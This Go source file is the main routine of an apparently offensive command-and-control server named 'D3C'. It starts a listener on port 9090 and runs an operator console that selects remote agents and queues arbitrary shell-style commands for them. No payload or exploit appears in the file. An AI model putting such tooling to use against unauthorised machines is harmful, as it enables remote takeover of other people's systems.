package main

import (
	"bufio"
	"d3c/server/commands"
	"d3c/server/helpers"
	"d3c/server/interfaces"
	"d3c/server/listeners"
	"global"
	globalhelpers "helpers"
	"log"
	"os"
	"strings"
)

func main() {
	log.Println("Execution started")

	go listeners.StartListener("9090")

	cliHandler()
}

func cliHandler() {
	for {
		if helpers.SelectedAgent != "" {
			print(helpers.SelectedAgent + "@D3C# ")
		} else {
			print("D3C> ")
		}

		reader := bufio.NewReader(os.Stdin)
		fullCommand, _ := reader.ReadString('\n')
		fullCommand = strings.TrimSuffix(strings.TrimSuffix(fullCommand, "\r"), "\n")

		separateCommand := globalhelpers.CommandsSplit(fullCommand)
		baseCommand := separateCommand[0]

		if len(baseCommand) > 0 {
			commandID := helpers.CommandValidation(baseCommand)

			if commandID != -1 {
				mapping := map[int]interfaces.Command{
					1: commands.Show{Command: separateCommand},
					2: commands.Select{Command: separateCommand},
					3: commands.Send{Command: separateCommand},
					4: commands.Get{Command: fullCommand},
				}

				response, _ := mapping[commandID].Exec()
				println(response)
			} else {
				if helpers.SelectedAgent != "" {
					command := &global.Command{}
					command.Request = fullCommand

					helpers.AddCommandToAgent(*command, helpers.SelectedAgent)
				} else {
					log.Println("Non-existent command!")
				}
			}
		}
	}
}
